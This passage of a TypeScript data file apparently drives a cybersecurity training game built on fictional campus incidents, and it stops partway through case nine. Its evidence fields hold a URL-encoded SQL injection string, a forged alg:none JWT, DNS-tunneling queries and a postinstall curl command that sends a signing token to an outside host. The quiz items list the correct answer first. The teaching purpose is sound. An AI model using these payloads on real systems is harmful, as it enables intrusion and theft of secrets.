export type QuestionType = 'multiple-choice' | 'true-false' | 'clue' | 'match';

export interface CaseEvidence {
  type: string;
  title: string;
  detail: string;
}

export interface CaseSuspect {
  name: string;
  role: string;
  note: string;
}

export interface CaseQuestion {
  id: string;
  type: QuestionType;
  prompt: string;
  options: string[];
}

export interface InvestigationCase {
  id: string;
  title: string;
  subtitle: string;
  category: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  duration: number;
  icon:
    | 'scan'
    | 'mail'
    | 'database'
    | 'fingerprint'
    | 'shield'
    | 'code'
    | 'globe'
    | 'footprints'
    | 'key'
    | 'sun';
  color: 'cyan' | 'emerald' | 'amber' | 'indigo' | 'violet' | 'rose';
  briefing: string;
  incident: string;
  evidence: CaseEvidence[];
  suspects: CaseSuspect[];
  timeline: string[];
  hints: string[];
  questions: CaseQuestion[];
}

export const cases: InvestigationCase[] = [
  {
    id: 'case-01',
    title: 'Phantom Login',
    subtitle: 'The Midnight Provost Email',
    category: 'Phishing & Social Engineering',
    difficulty: 'Easy',
    duration: 15,
    icon: 'mail',
    color: 'cyan',
    briefing:
      'Three faculty members reported an urgent payroll verification email claiming to come from the Office of the Provost at 00:42. One recipient entered their SSO credentials before noticing the page looked slightly off.',
    incident: 'Simulated phishing triage using synthetic mail headers and identity logs.',
    evidence: [
      {
        type: 'EMAIL HEADER',
        title: 'Captured Message Headers',
        detail:
          'From: "Provost Payroll" <payroll@campus-edu.example> | Return-Path: <bounce@campxs-portal.example> | SPF: fail (sender IP 198.51.100.44 not authorized) | DKIM: none',
      },
      {
        type: 'DNS RECORD',
        title: 'WHOIS & Domain Age Lookup',
        detail:
          'Domain campxs-portal.example was registered 14 hours before the campaign via a privacy proxy. Official university domain is campus-edu.example (registered 2004).',
      },
      {
        type: 'SSO LOG',
        title: 'Identity Provider Sign-In Audit',
        detail:
          '00:49:12 UTC — Prof. Elena Vance authenticated from 198.51.100.88 (proxy exit) followed by an MFA push denial, then a second push approved at 00:50:04 UTC.',
      },
      {
        type: 'WEB PROXY',
        title: 'Outbound Referrer Trace',
        detail:
          'GET https://campxs-portal.example/sso/verify?uid=evance -> POST /collect -> 302 Redirect to https://campus-edu.example/payroll-ok',
      },
    ],
    suspects: [
      {
        name: 'External Phishing Kit',
        role: 'Lookalike Domain Operator',
        note: 'Registered campxs-portal.example using a single-character homoglyph typo.',
      },
      {
        name: 'Prof. Elena Vance',
        role: 'Compromised Faculty Member',
        note: 'Clicked the link at 00:48 UTC and approved a second MFA prompt while half-asleep.',
      },
      {
        name: 'Campus Mail Relay',
        role: 'Internal SMTP Gateway',
        note: 'Flagged SPF=fail in headers but delivered to Quarantine-Bypass test group.',
      },
    ],
    timeline: [
      'Prof. Vance approves second MFA prompt',
      'Lookalike domain campxs-portal.example registered',
      'Payroll verification email arrives at 00:42 UTC',
      'Browser redirects to real campus payroll page after credential capture',
    ],
    hints: [
      'Compare the Return-Path domain spelling carefully against campus-edu.example.',
      'Check the SPF and DKIM authentication results in the email header.',
      'Look at why a second MFA push occurred in the SSO sign-in audit.',
    ],
    questions: [
      {
        id: 'c1-q1',
        type: 'clue',
        prompt: 'Which technical indicator in the email header immediately exposes the spoofed sender?',
        options: [
          'SPF fail with an unauthorized Return-Path domain (campxs-portal.example)',
          'The message arrived after midnight local time',
          'The subject line mentioned payroll verification',
          'The sender display name included the word Provost',
        ],
      },
      {
        id: 'c1-q2',
        type: 'true-false',
        prompt: 'True or False: The phishing page left the victim on an error screen after stealing their password.',
        options: ['True', 'False'],
      },
      {
        id: 'c1-q3',
        type: 'multiple-choice',
        prompt: 'How did the attacker bypass MFA for Prof. Vance at 00:50:04 UTC?',
        options: [
          'MFA fatigue — repeating push requests until the victim approved',
          'Cloned hardware FIDO2 security key',
          'Sim-swapped the campus phone switchboard',
          'Disabled SSO globally via admin console',
        ],
      },
      {
        id: 'c1-q4',
        type: 'match',
        prompt: 'Match the immediate containment step that stops further lateral access from this incident:',
        options: [
          'Revoke Prof. Vance active SSO tokens and force password + MFA re-enrollment',
          'Shut down the campus Wi-Fi controller',
          'Delete the official campus-edu.example DNS zone',
          'Disable all faculty email accounts for 30 days',
        ],
      },
    ],
  },
  {
    id: 'case-02',
    title: 'Gradebook Drift',
    subtitle: 'Silent Rows in the Registrar DB',
    category: 'Database Forensics',
    difficulty: 'Easy',
    duration: 15,
    icon: 'database',
    color: 'emerald',
    briefing:
      'During final transcript audits, the Registrar noticed that three failing mid-term grades in CS-402 changed to A+ overnight without any instructor approval workflow.',
    incident: 'Simulated SQL query log and database permission review.',
    evidence: [
      {
        type: 'SQL AUDIT',
        title: 'PostgreSQL Statement Log (02:11 UTC)',
        detail:
          "ROLE: svc_library_kiosk | QUERY: UPDATE registrar.grades SET letter='A+' WHERE course='CS-402' AND student_id IN (4410, 4482, 4509);",
      },
      {
        type: 'ROLE GRANTS',
        title: 'Database Privilege Matrix',
        detail:
          'svc_library_kiosk was mistakenly granted schema-wide UPDATE on registrar.* during a summer migration instead of SELECT on library.catalog.',
      },
      {
        type: 'APP LOG',
        title: 'Library Kiosk Search Endpoint',
        detail:
          '02:10:44 UTC — GET /kiosk/books?q=algorithms%27%3BUPDATE%20registrar.grades... Status 200 (raw string concatenation detected in search.ts:48).',
      },
      {
        type: 'NETWORK',
        title: 'Client Source IP Mapping',
        detail:
          'Request originated from Dorm Subnet 10.24.18.91 (public student lounge terminal, unauthenticated kiosk API).',
      },
    ],
    suspects: [
      {
        name: 'svc_library_kiosk',
        role: 'Over-Privileged DB Service Account',
        note: 'Should only read catalog tables, yet holds UPDATE permission on registrar.grades.',
      },
      {
        name: 'Prof. Samir Patel',
        role: 'CS-402 Instructor',
        note: 'Did not log into the grading portal after 18:00; two-factor hardware token confirmed offline.',
      },
      {
        name: 'Dorm Terminal 10.24.18.91',
        role: 'Attack Origin Host',
        note: 'Sent URL-encoded SQL payload to the library search endpoint.',
      },
    ],
    timeline: [
      'Summer migration grants svc_library_kiosk broad registrar.* privileges',
      'Registrar audit flags unexpected A+ entries in CS-402',
      'URL-encoded SQL payload hits /kiosk/books endpoint at 02:10:44 UTC',
      'PostgreSQL executes stacked UPDATE on registrar.grades',
    ],
    hints: [
      'Check which database role actually ran the UPDATE statement.',
      'Look at the URL query parameter %27%3B in the Library Kiosk app log.',
      'Notice the two flaws: unparameterized SQL AND excessive DB privileges.',
    ],
    questions: [
      {
        id: 'c2-q1',
        type: 'clue',
        prompt: 'Which vulnerability in the Library Kiosk app allowed the grade modification?',
        options: [
          'SQL injection via raw string concatenation in the search query',
          'Expired TLS certificate on the kiosk web server',
          'Cross-site request forgery in Prof. Patel browser',
          'Default administrator password on the PostgreSQL server',
        ],
      },
      {
        id: 'c2-q2',
        type: 'true-false',
        prompt: 'True or False: Prof. Patel account was compromised to update the grades.',
        options: ['True', 'False'],
      },
      {
        id: 'c2-q3',
        type: 'multiple-choice',
        prompt: 'Why was the library service account able to modify the registrar schema at all?',
        options: [
          'Violation of least privilege — it held UPDATE rights on registrar.*',
          'PostgreSQL disables permissions after midnight',
          'The student guessed the instructor hardware token',
          'The gradebook table was stored in browser localStorage',
        ],
      },
      {
        id: 'c2-q4',
        type: 'match',
        prompt: 'Match the primary code fix that eliminates the injection vector:',
        options: [
          'Use parameterized prepared statements and restrict svc_library_kiosk to SELECT on library.catalog',
          'Hide the kiosk search bar from the navigation menu',
          'Block all dorm traffic to the library website',
          'Rename the registrar.grades column from letter to score',
        ],
      },
    ],
  },
  {
    id: 'case-03',
    title: 'Badge Clone',
    subtitle: 'After-Hours Lab Entry',
    category: 'Identity & Access',
    difficulty: 'Easy',
    duration: 15,
    icon: 'fingerprint',
    color: 'amber',
    briefing:
      'A prototype FPGA board vanished from Robotics Lab B-204 between 21:00 and 23:30. Door telemetry shows researcher Maya Lin badged in at 22:14, yet campus transit logs show she boarded a train 12 miles away at 22:08.',
    incident: 'Simulated physical access telemetry and credential anomaly investigation.',
    evidence: [
      {
        type: 'DOOR TELEMETRY',
        title: 'Lab B-204 RFID Reader Log',
        detail:
          '22:14:09 — Card UID 0x8A31F902 (Maya Lin) | Protocol: Legacy 125kHz Prox (unencrypted static serial) | Door opened.',
      },
      {
        type: 'TRANSIT API',
        title: 'Campus Shuttle & Rail Tap Log',
        detail:
          '22:08:31 — Maya Lin mobile NFC pass tapped at North Station turnstile (12 miles from Lab B-204).',
      },
      {
        type: 'CCTV FRAME',
        title: 'Hallway Motion Sensor Note',
        detail:
          '21:47:15 — Unidentified individual wearing a gray hoodie lingered near the shared coffee counter where Maya left her lanyard briefly at 14:10.',
      },
      {
        type: 'BADGE AUDIT',
        title: 'Impossible Travel Alert',
        detail:
          'System flagged a 12-mile delta in 5 minutes 38 seconds (implied speed 128 mph) but alert notifications were routed to an unmonitored inbox.',
      },
    ],
    suspects: [
      {
        name: 'Maya Lin',
        role: 'Graduate Robotics Researcher',
        note: 'Verified on North Station transit cameras at 22:08; left lanyard unattended at 14:10.',
      },
      {
        name: 'Unidentified Cloner',
        role: 'Proximity Skimmer Operator',
        note: 'Likely read the unencrypted 125kHz Prox UID while Maya stepped away at 14:10.',
      },
      {
        name: 'Facility Alert Router',
        role: 'Physical Security SIEM',
        note: 'Correctly detected impossible travel, but alerts went to a defunct distribution list.',
      },
    ],
    timeline: [
      'Maya leaves lanyard unattended near shared coffee counter at 14:10',
      'Maya taps mobile NFC pass at North Station at 22:08:31',
      'Cloned 125kHz Prox badge opens Lab B-204 at 22:14:09',
      'Impossible travel alert fires to unmonitored inbox',
    ],
    hints: [
      'Notice the RFID protocol used by Lab B-204: 125kHz Prox broadcasts a static serial with no challenge-response.',
      'Compare Maya Lin timestamp at North Station with the Lab B-204 door swipe.',
      'Check what happened to the automated Impossible Travel alert.',
    ],
    questions: [
      {
        id: 'c3-q1',
        type: 'true-false',
        prompt: 'True or False: Maya Lin physically entered Lab B-204 at 22:14:09.',
        options: ['True', 'False'],
      },
      {
        id: 'c3-q2',
        type: 'clue',
        prompt: 'What physical/cryptographic weakness allowed the attacker to duplicate the badge?',
        options: [
          'Legacy 125kHz Prox cards transmit an unencrypted static UID that is trivially cloned',
          'The door lock ran out of backup battery power',
          'Maya shared her PIN code on a public whiteboard',
          'The transit turnstile leaked her home address',
        ],
      },
      {
        id: 'c3-q3',
        type: 'multiple-choice',
        prompt: 'Why did security fail to stop the theft in real time even though the SIEM detected the anomaly?',
        options: [
          'The impossible travel alert was routed to an unmonitored email inbox',
          'The SIEM server was turned off during weekends',
          'The attacker deleted the transit database',
          '128 mph is within normal campus walking speed thresholds',
        ],
      },
      {
        id: 'c3-q4',
        type: 'match',
        prompt: 'Match the upgrade that prevents passive skimming and cloning of lab badges:',
        options: [
          'Migrate readers and cards to encrypted DESFire EV3 / cryptographic challenge-response credentials',
          'Print larger photos on the plastic ID badges',
          'Disable the North Station transit API integration',
          'Require all researchers to carry two 125kHz Prox cards',
        ],
      },
    ],
  },
  {
    id: 'case-04',
    title: 'Broken Token',
    subtitle: 'The Open Campus API',
    category: 'Web & API Security',
    difficulty: 'Medium',
    duration: 20,
    icon: 'code',
    color: 'indigo',
    briefing:
      'Over 1,400 student scholarship PDFs were downloaded in 90 seconds from the new Student Aid Portal API. Every request used a valid-looking Bearer token.',
    incident: 'Simulated API gateway log and JWT token inspection.',
    evidence: [
      {
        type: 'JWT PAYLOAD',
        title: 'Captured Authorization Header',
        detail:
          'Header: {"alg":"none","typ":"JWT"} | Payload: {"sub":"stu_9012","role":"admin","iat":1773700000} | Signature: (empty)',
      },
      {
        type: 'API GATEWAY',
        title: 'Request Burst Trace',
        detail:
          'GET /api/v1/aid-letters/1001 .. /api/v1/aid-letters/2420 -> HTTP 200 OK (avg 14ms). Sequential integer IDs, no ownership check.',
      },
      {
        type: 'SOURCE DIFF',
        title: 'authMiddleware.ts (Line 19)',
        detail:
          'const decoded = jwt.decode(token); // TODO: switch to jwt.verify() before launch',
      },
      {
        type: 'RATE LIMITER',
        title: 'Gateway Policy Config',
        detail:
          'Rate limiting set to 5,000 req/min per IP for /api/v1/*; zero per-user authorization check on :letterId.',
      },
    ],
    suspects: [
      {
        name: 'stu_9012',
        role: 'Token Forger',
        note: 'Crafted an unsigned alg:none JWT claiming role:admin and enumerated sequential IDs.',
      },
      {
        name: 'authMiddleware.ts',
        role: 'Unverified JWT Decoder',
        note: 'Used jwt.decode() instead of jwt.verify(), skipping signature and algorithm checks.',
      },
      {
        name: 'Aid-Letters Endpoint',
        role: 'IDOR Vulnerable Route',
        note: 'Returned any aid letter by sequential ID without checking req.user.id === record.ownerId.',
      },
    ],
    timeline: [
      'Developer leaves jwt.decode() placeholder in authMiddleware.ts',
      'Attacker crafts unsigned JWT with alg:none and role:admin',
      'Script enumerates /api/v1/aid-letters/1001 through 2420',
      '1,400+ scholarship PDFs exfiltrated in 90 seconds',
    ],
    hints: [
      'Compare jwt.decode() vs jwt.verify() in Node JWT libraries.',
      'Look at the JWT header field "alg":"none" and the empty signature.',
      'Notice how sequential IDs (/1001 .. /2420) made mass scraping effortless (BOLA/IDOR).',
    ],
    questions: [
      {
        id: 'c4-q1',
        type: 'clue',
        prompt: 'Why did the API accept a forged admin token with no cryptographic signature?',
        options: [
          'authMiddleware.ts called jwt.decode() instead of jwt.verify() and allowed alg:none',
          'The HMAC secret key was 256 bits long',
          'The client browser cleared its cookies before each call',
          'HTTP 200 responses automatically sign JWT payloads',
        ],
      },
      {
        id: 'c4-q2',
        type: 'multiple-choice',
        prompt: 'Even with a valid student token, what second flaw let one user fetch everyone else’s PDF?',
        options: [
          'Broken Object Level Authorization (IDOR) — no ownership check on sequential letter IDs',
          'SQL injection in the Bearer prefix',
          'Cross-site scripting inside the PDF filename',
          'DNS cache poisoning on localhost',
        ],
      },
      {
        id: 'c4-q3',
        type: 'true-false',
        prompt: 'True or False: Increasing the rate limit to 10,000 requests per minute would fix the authorization bug.',
        options: ['True', 'False'],
      },
      {
        id: 'c4-q4',
        type: 'match',
        prompt: 'Match the complete remediation pair required before re-enabling the endpoint:',
        options: [
          'Enforce jwt.verify() with pinned HS256/RS256 algorithms AND verify record ownership + UUIDs',
          'Switch from JSON to XML payloads in the JWT header',
          'Move the Authorization header into a URL query parameter',
          'Encode the sequential IDs with Base64 without checking ownership',
        ],
      },
    ],
  },
  {
    id: 'case-05',
    title: 'Shadow Bucket',
    subtitle: 'Leaked Research Snapshots',
    category: 'Cloud & DevOps',
    difficulty: 'Medium',
    duration: 20,
    icon: 'shield',
    color: 'cyan',
    briefing:
      'A biology lab’s unpublished genomic dataset appeared on a public archive mirror. No intrusion occurred on the lab’s local servers, pointing directly to cloud storage misconfiguration.',
    incident: 'Simulated cloud IAM policy diff and object access log review.',
    evidence: [
      {
        type: 'IAM POLICY',
        title: 'Terraform Commit #882a1',
        detail:
          'acl = "public-read" added during debug session on bucket bio-genomics-snapshots-prod; Principal: "*" Action: "s3:GetObject".',
      },
      {
        type: 'ACCESS LOG',
        title: 'Cloud Storage Read Audit',
        detail:
          '04:12:19 UTC — Anonymous GET /bio-genomics-snapshots-prod/batch_09.tar.gz from 203.0.113.77 (User-Agent: bucket-indexer/1.2).',
      },
      {
        type: 'CI/CD CHECK',
        title: 'Infrastructure Scanner Output',
        detail:
          'tfsec flagged S3-0001 (Public Read ACL) as WARNING (non-blocking) on PR #114, which was merged without security sign-off.',
      },
      {
        type: 'METADATA',
        title: 'Bucket Encryption & Versioning',
        detail:
          'Server-side SSE-S3 encryption was enabled, which transparently decrypts objects for any allowed reader—including Principal: "*".',
      },
    ],
    suspects: [
      {
        name: 'PR #114 Debug Config',
        role: 'Terraform Policy Drift',
        note: 'Set public-read ACL to unblock a temporary script and was merged to main.',
      },
      {
        name: 'bucket-indexer/1.2',
        role: 'Automated Cloud Scanner',
        note: 'Continuously probes predictable bucket names for open Principal:"*" policies.',
      },
      {
        name: 'SSE-S3 Default Encryption',
        role: 'Misunderstood Control',
        note: 'Protects disks at rest, not unauthorized public GET requests.',
      },
    ],
    timeline: [
      'Developer adds acl = "public-read" in Terraform PR #114',
      'Non-blocking tfsec warning is ignored and PR #114 merges',
      'Automated bucket-indexer discovers and downloads batch_09.tar.gz',
      'Unpublished dataset surfaces on external public mirror',
    ],
    hints: [
      'Check why SSE-S3 encryption did not stop the anonymous downloader.',
      'Look at the CI/CD scanner behavior on PR #114.',
      'Notice Principal: "*" combined with s3:GetObject.',
    ],
    questions: [
      {
        id: 'c5-q1',
        type: 'clue',
        prompt: 'Which configuration directly exposed the research snapshots to the internet?',
        options: [
          'Bucket policy / ACL granting s3:GetObject to Principal: "*" (public-read)',
          'Using Terraform instead of clicking in the console',
          'Naming the file batch_09.tar.gz',
          'Enabling object versioning on the storage bucket',
        ],
      },
      {
        id: 'c5-q2',
        type: 'true-false',
        prompt: 'True or False: Default server-side encryption (SSE-S3) prevents unauthenticated public downloads when a bucket policy allows Principal: "*".',
        options: ['True', 'False'],
      },
      {
        id: 'c5-q3',
        type: 'multiple-choice',
        prompt: 'How did the automated crawler find the bucket so quickly?',
        options: [
          'Predictable bucket naming combined with continuous internet bucket enumeration',
          'It decrypted the researcher’s laptop hard drive',
          'It bribed the cloud provider datacenter staff',
          'It exploited a zero-day in gzip compression',
        ],
      },
      {
        id: 'c5-q4',
        type: 'match',
        prompt: 'Match the preventive guardrail that stops this class of leak before deployment:',
        options: [
          'Enable account-level Block Public Access AND make CI/CD public-ACL checks blocking',
          'Switch from .tar.gz to .zip archives',
          'Disable cloud access logging to save storage space',
          'Allow Principal: "*" only between 02:00 and 05:00 UTC',
        ],
      },
    ],
  },
  {
    id: 'case-06',
    title: 'Beacon at 03:14',
    subtitle: 'Outbound DNS Tunneling',
    category: 'Network Traffic',
    difficulty: 'Medium',
    duration: 25,
    icon: 'globe',
    color: 'violet',
    briefing:
      'Campus firewall rules block direct outbound HTTP/SSH from the Isolated Research VLAN, yet telemetry shows 48 MB of data slowly leaving a workstation every night at 03:14.',
    incident: 'Simulated DNS resolver logs and endpoint socket telemetry.',
    evidence: [
      {
        type: 'DNS LOG',
        title: 'Recursive Resolver Query Sample',
        detail:
          '03:14:02 — TXT query: 4a6f686e2d5365637265742d4b6579.exfil-cdn.example (62-char hex subdomain, NXDOMAIN/TXT payload 180 bytes).',
      },
      {
        type: 'TRAFFIC STATS',
        title: 'Query Frequency Profile',
        detail:
          'Workstation WS-CHEM-19 sent 18,400 unique subdomain queries to *.exfil-cdn.example in 22 minutes; zero browser traffic active.',
      },
      {
        type: 'PROCESS TREE',
        title: 'Endpoint Task Snapshot',
        detail:
          'PID 4812: /usr/local/bin/sync-helper (unsigned binary launched by cron at 03:14) -> UDP port 53 to campus resolver 10.0.0.53.',
      },
      {
        type: 'FIREWALL',
        title: 'VLAN Egress ACL',
        detail:
          'TCP 80/443/22: DENY | UDP 53 to internal resolver 10.0.0.53: ALLOW (recursive resolver forwards external queries).',
      },
    ],
    suspects: [
      {
        name: 'sync-helper (PID 4812)',
        role: 'Cron-Scheduled Exfiltration Agent',
        note: 'Chunks files into hex-encoded DNS labels and receives commands in TXT responses.',
      },
      {
        name: 'Campus Resolver 10.0.0.53',
        role: 'Recursive Forwarding Relay',
        note: 'Legitimately resolves external domains on behalf of the isolated VLAN, creating an unintended bridge.',
      },
      {
        name: 'exfil-cdn.example',
        role: 'Authoritative C2 Nameserver',
        note: 'Logs incoming subdomain hex strings and replies with TXT payloads.',
      },
    ],
    timeline: [
      'Cron triggers unsigned binary sync-helper at 03:14',
      'Binary encodes local research data into 62-char hex subdomains',
      'Campus resolver 10.0.0.53 forwards queries to authoritative server for exfil-cdn.example',
      '18,400 queries transfer 48 MB without triggering TCP egress blocks',
    ],
    hints: [
      'Decode or inspect the structure of 4a6f686e2d5365637265742d4b6579.exfil-cdn.example.',
      'Why did blocking TCP 80/443/22 fail to isolate the VLAN completely?',
      'Look at the high entropy and sheer volume of unique subdomains per minute.',
    ],
    questions: [
      {
        id: 'c6-q1',
        type: 'clue',
        prompt: 'What technique is PID 4812 using to bypass the strict TCP egress firewall?',
        options: [
          'DNS tunneling — encoding exfiltrated bytes inside unique subdomain labels forwarded by 10.0.0.53',
          'ARP spoofing on the campus fiber backbone',
          'BGP route hijacking over UDP port 443',
          'USB sneaker-net transfer by the night janitor',
        ],
      },
      {
        id: 'c6-q2',
        type: 'multiple-choice',
        prompt: 'Which statistical anomaly in the DNS log clearly distinguishes tunneling from normal browsing?',
        options: [
          '18,400 high-entropy, non-cached unique subdomains to a single domain at 03:14',
          'Use of UDP port 53 instead of TCP port 53',
          'Querying an internal IPv4 resolver address',
          'Receiving a response packet under 512 bytes',
        ],
      },
      {
        id: 'c6-q3',
        type: 'true-false',
        prompt: 'True or False: Blocking UDP 53 directly on the workstation firewall stops the leak even if the internal resolver 10.0.0.53 still resolves external domains—wait, read carefully: if WS-CHEM-19 is blocked from talking to 10.0.0.53, can it still reach exfil-cdn.example?',
        options: ['True', 'False'],
      },
      {
        id: 'c6-q4',
        type: 'match',
        prompt: 'Match the defense-in-depth architecture for an isolated research VLAN:',
        options: [
          'Restrict resolver forwarding via RPZ/allowlist + kill/quarantine sync-helper + alert on high DNS entropy',
          'Allow direct outbound SSH so researchers stop using DNS',
          'Disable all internal hostnames across the entire campus',
          'Increase DNS cache TTL to 5 seconds',
        ],
      },
    ],
  },
  {
    id: 'case-07',
    title: 'Ciphered Keyring',
    subtitle: 'The Rotated Signing Key',
    category: 'Cryptography',
    difficulty: 'Medium',
    duration: 25,
    icon: 'key',
    color: 'amber',
    briefing:
      'An automated transcript verification service began accepting forged diplomas signed with a retired 2022 key. Developers thought rotating keys in January had invalidated old signatures.',
    incident: 'Simulated key management log and signature verification trace.',
    evidence: [
      {
        type: 'JWKS ENDPOINT',
        title: 'Public Verification Key Set',
        detail:
          '{"keys":[{"kid":"key-2026","status":"active"},{"kid":"key-2022","status":"retired","note":"kept in JWKS for historical verification"}]}',
      },
      {
        type: 'GIT HISTORY',
        title: 'Legacy Config Leak (Public Repo)',
        detail:
          'Commit c4091b (2022): test_private_key.pem accidentally committed and later deleted in c4092c—but still reachable in Git commit history.',
      },
      {
        type: 'VERIFY TRACE',
        title: 'Diploma Validator Output',
        detail:
          'Token header specified kid="key-2022". Validator checked JWKS, found key-2022 present, ignored status:"retired", and returned VALID=true.',
      },
      {
        type: 'POLICY DOC',
        title: 'Key Rotation Runbook',
        detail:
          'Rule 4: Retired keys must never sign new documents issued after 2023-01-01; historical archives require timestamp authority verification.',
      },
    ],
    suspects: [
      {
        name: 'key-2022 Private Key',
        role: 'Leaked Git History Secret',
        note: 'Deleting a file in a later Git commit does not erase it from Git object history.',
      },
      {
        name: 'Diploma Validator Service',
        role: 'Over-Trusting Verifier',
        note: 'Trusted any kid present in JWKS regardless of status:"retired" or issued-at date.',
      },
      {
        name: 'Commit c4092c',
        role: 'Incomplete Secret Cleanup',
        note: 'Removed the PEM file from HEAD without revoking the key or rewriting/scrubbing history.',
      },
    ],
    timeline: [
      'Private key test_private_key.pem committed to repo in 2022',
      'File deleted in follow-up commit c4092c without key revocation',
      'Validator keeps key-2022 in active JWKS and ignores retired status',
      'Attacker extracts key from Git history and signs new 2026 diploma',
    ],
    hints: [
      'Remember how Git stores previous commits even after a file deletion commit.',
      'Check why the validator accepted a 2026 diploma signed with key-2022.',
      'Look at the difference between removing a key from HEAD vs revoking it from JWKS.',
    ],
    questions: [
      {
        id: 'c7-q1',
        type: 'true-false',
        prompt: 'True or False: Deleting a private key file in a subsequent Git commit removes it from the repository history.',
        options: ['True', 'False'],
      },
      {
        id: 'c7-q2',
        type: 'clue',
        prompt: 'Why did the diploma validator accept a newly issued 2026 diploma signed by key-2022?',
        options: [
          'It trusted key-2022 from the JWKS without enforcing status:"retired" or issuance date bounds',
          'RSA-2048 signatures expire after 10 minutes',
          'The JSON key ID field was encrypted with AES',
          'Git automatically re-signs old commits during rotation',
        ],
      },
      {
        id: 'c7-q3',
        type: 'multiple-choice',
        prompt: 'What is the proper lifecycle response once a private key has ever been committed to a repository?',
        options: [
          'Treat the key as permanently compromised: revoke it immediately and never accept new signatures from it',
          'Rename the file to .env.bak in a new commit',
          'Change the repository visibility from public to internal for one hour',
          'Switch the kid string from key-2022 to key-2022-old',
        ],
      },
      {
        id: 'c7-q4',
        type: 'match',
        prompt: 'Match the safe way to verify genuine historical 2022 diplomas without leaving a compromised key trusted for 2026:',
        options: [
          'Revoke key-2022 from JWKS and migrate verified 2022 records onto a timestamped archive / re-sign with key-2026',
          'Keep key-2022 in JWKS indefinitely for all requests',
          'Disable signature verification on weekends',
          'Store the private key inside the public JWKS endpoint',
        ],
      },
    ],
  },
  {
    id: 'case-08',
    title: 'Ghost Commit',
    subtitle: 'Sabotage in the Build Pipeline',
    category: 'Supply Chain',
    difficulty: 'Hard',
    duration: 30,
    icon: 'scan',
    color: 'rose',
    briefing:
      'Production builds of the Campus Transit app began exfiltrating environment variables during CI packaging, even though the source code in main passed peer review.',
    incident: 'Simulated CI/CD runner logs, dependency lockfile diff, and build artifact inspection.',
    evidence: [
      {
        type: 'LOCKFILE DIFF',
        title: 'package-lock.json Change',
        detail:
          'Dependency @campus-ui/colors bumped 1.2.0 -> 1.2.1 (published from an unverified maintainer mirror with a new postinstall script).',
      },
      {
        type: 'CI LOG',
        title: 'Build Runner Step 4: npm ci',
        detail:
          'Executing postinstall: node scripts/telemetry.js -> read process.env.SIGNING_TOKEN -> curl -s -X POST https://pkg-metrics.example/collect',
      },
      {
        type: 'GIT LOG',
        title: 'Source Repository Status',
        detail:
          'Zero changes in src/ since last signed release. A Dependabot-style PR auto-merged patch update 1.2.1 because tests passed.',
      },
      {
        type: 'PIPELINE CONFIG',
        title: '.github/workflows/release.yml',
        detail:
          'Runner executes npm ci with full release secrets mounted in environment; --ignore-scripts not set; package provenance not verified.',
      },
    ],
    suspects: [
      {
        name: '@campus-ui/colors@1.2.1',
        role: 'Trojanized Patch Release',
        note: 'Introduced a malicious postinstall lifecycle script absent in 1.2.0.',
      },
      {
        name: 'Auto-Merge Patch Rule',
        role: 'CI Governance Gap',
        note: 'Merged unreviewed patch bumps automatically without diffing lifecycle scripts.',
      },
      {
        name: 'Release Workflow Runner',
        role: 'Over-Exposed Secret Context',
        note: 'Mounted production SIGNING_TOKEN during dependency installation step.',
      },
    ],
    timeline: [
      'Malicious patch @campus-ui/colors@1.2.1 adds postinstall script',
      'Auto-merge rule accepts lockfile bump after unit tests pass',
      'CI runner mounts SIGNING_TOKEN and runs npm ci',
      'postinstall script exfiltrates SIGNING_TOKEN to pkg-metrics.example',
    ],
    hints: [
      'Notice that src/ was untouched—look inside package-lock.json and npm lifecycle hooks.',
      'Check which CI step had SIGNING_TOKEN in process.env when npm ci ran.',
      'Consider why unit tests passed while secrets were stolen during install.',
    ],
    questions: [
      {
        id: 'c8-q1',
        type: 'clue',
        prompt: 'Where did the malicious code execute if src/ passed code review untouched?',
        options: [
          'Inside the postinstall lifecycle script of @campus-ui/colors@1.2.1 during npm ci',
          'Inside the CSS minifier plugin on the developer laptop',
          'Inside the campus transit bus GPS hardware',
          'Inside an HTML comment in index.html',
        ],
      },
      {
        id: 'c8-q2',
        type: 'true-false',
        prompt: 'True or False: Passing unit tests guarantees a dependency patch update contains no malicious install-time behavior.',
        options: ['True', 'False'],
      },
      {
        id: 'c8-q3',
        type: 'multiple-choice',
        prompt: 'Why was SIGNING_TOKEN exposed to the package postinstall script?',
        options: [
          'Production secrets were mounted into the environment during the untrusted dependency install step',
          'Git commits automatically encrypt environment variables',
          'TypeScript compiled process.env into CSS variables',
          'The developer pasted the token into README.md',
        ],
      },
      {
        id: 'c8-q4',
        type: 'match',
        prompt: 'Match the hardened CI/CD supply-chain control set:',
        options: [
          'Run npm ci --ignore-scripts, isolate build vs signing jobs (least-privilege secrets), and verify package provenance / lockfile diffs',
          'Disable unit tests so builds finish faster',
          'Always use floating ^latest versions in package.json',
          'Allow postinstall scripts to curl external telemetry endpoints',
        ],
      },
    ],
  },
  {
    id: 'case-09',
    title: 'Dormant Macro',
    subtitle: 'The Financial Aid Attachment',
    category: 'Malware Analysis',
    difficulty: 'Hard',
    duration: 30,
    icon: 'footprints',
    color: 'rose',
    briefing:
      'An administrative workstation in Financial Aid began contacting an external staging host 48 hours after opening a spreadsheet—not immediately, fooling initial sandbox checks.',
    incident: 'Simulated static document macro inspection and delayed-execution telemetry.',
    evidence: [
      {
        type: 'STATIC ANALYSIS',
        title: 'VBA Macro Stream (Module1)',
        detail:
          'Sub Workbook_Open(): Creates Scheduled Task "FontCacheUpdate" set to trigger at +48h; payload Base64-decoded only if hostname matches "FINAID-*".',
      },
      {
        type: 'SANDBOX REPORT',
        title: 'Automated Detonation (5-min window)',
        detail:
          'Verdict: CLEAN (no network connections or suspicious child processes observed during 300-second sandbox run).',
      },
      {
        type: 'HOST TELEMETRY',
        title: 'Task Scheduler & PowerShell Log',
        detail:
          'T+48:00:00 — Task "FontCacheUpdate" spawned powershell.exe -EncodedCommand ... -> queried C2 staging URL.',
      },
      {
        type: 'EMAIL GATEWAY',
        title: 'Attachment Metadata',
        detail:
          'Filename: Aid_Adjustment_2026.xlsm (macro-enabled workbook). Delivered from compromised partner vendor account.',
      },
    ],
    suspects: [
      {
        name: 'Module1 Time-Bomb Macro',
        role: 'Evasive Persistence Dropper',
        note: 'Used a 48-hour scheduled task and hostname guard to evade 5-minute sandboxes.',
      },
      {
        name: 'Sandbox 5-Min Timeout',
        role: 'Dynamic Analysis Blind Spot',
        note: 'Closed the analysis VM 47 hours and 55 minutes before the scheduled task fired.',
      },
      {
        name: 'Compromised Vendor Mail',
        role: 'Initial Delivery Vector',
        note: 'Trusted vendor domain allowed .xlsm attachment past basic reputation checks.',
      },
    ],
    timeline: [
